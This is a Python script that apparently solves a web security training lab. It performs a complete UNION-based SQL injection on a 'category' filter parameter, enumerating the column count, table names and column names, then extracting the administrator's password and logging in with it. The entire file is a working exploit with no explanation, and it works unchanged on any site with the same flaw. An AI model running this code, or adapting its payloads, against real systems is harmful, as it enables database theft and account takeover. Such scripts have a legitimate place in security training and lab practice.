import requests
import re
from bs4 import BeautifulSoup

def get_column_num(session, domain):
    column_num = 1

    while True:
        column_url = domain + requests.utils.quote("/filter?category=' order by {} -- -".format(column_num), safe='/:?=')
        r = session.get(column_url)
        if (r.status_code != 200):
            break
        column_num += 1        
    column_num -= 1
    return column_num

def get_table(session, domain, column_num):
    payload_element = ["table_name"]
    for _ in range(column_num - 1):
        payload_element.append('null')
    payload = "' union select {} from information_schema.tables where table_name like 'users_%'-- -".format(', '.join(payload_element))
    payload_url = domain + requests.utils.quote("/filter?category=" + payload, safe='/:?=')
    r = session.get(payload_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    table = soup.find('th').text
    return table
   

def get_columns_from_table(session, domain, column_num, table):
    payload_element = ["column_name"]
    for _ in range(column_num - 1):
        payload_element.append('null')
    payload = "' union select {} from information_schema.columns where table_name = '{}'-- -".format(', '.join(payload_element), table)
    payload_url = domain + requests.utils.quote("/filter?category=" + payload, safe='/:?=')
    r = session.get(payload_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    columns = []
    for column in soup.find_all('th'):
        columns.append(column.text)
    return columns

def get_credentials(session, domain, column_num, table, columns):
    for _ in range(column_num - 2):
        columns.append('null')
    #columns[0] = 'username_*'
    #columns[1] = 'password_*'
    payload = "' union select {} from {} where {} = 'administrator' -- -".format(', '.join(columns), table, columns[0])
    payload_url = domain + requests.utils.quote("/filter?category=" + payload, safe='/:?=')
    r = session.get(payload_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    username = 'administrator'
    password = soup.find('td').text  
    return username, password

def get_csrf(session, domain):
    login_url = domain + '/login'
    r = session.get(login_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def solve_lab(session, domain, username, password, csrf):
    data = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    r = session.post(domain + '/login', data = data)
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not Solved')

if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ');
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    session = requests.Session()
    try:
        column_num = get_column_num(session, domain)
        table = get_table(session, domain, column_num)
        columns = get_columns_from_table(session, domain, column_num, table)
        username, password = get_credentials(session, domain, column_num, table, columns)
        csrf = get_csrf(session, domain)
        solve_lab(session, domain, username, password, csrf)
    except requests.exceptions.ConnectionError:
        print('Error connecting to the server. Check your URL.')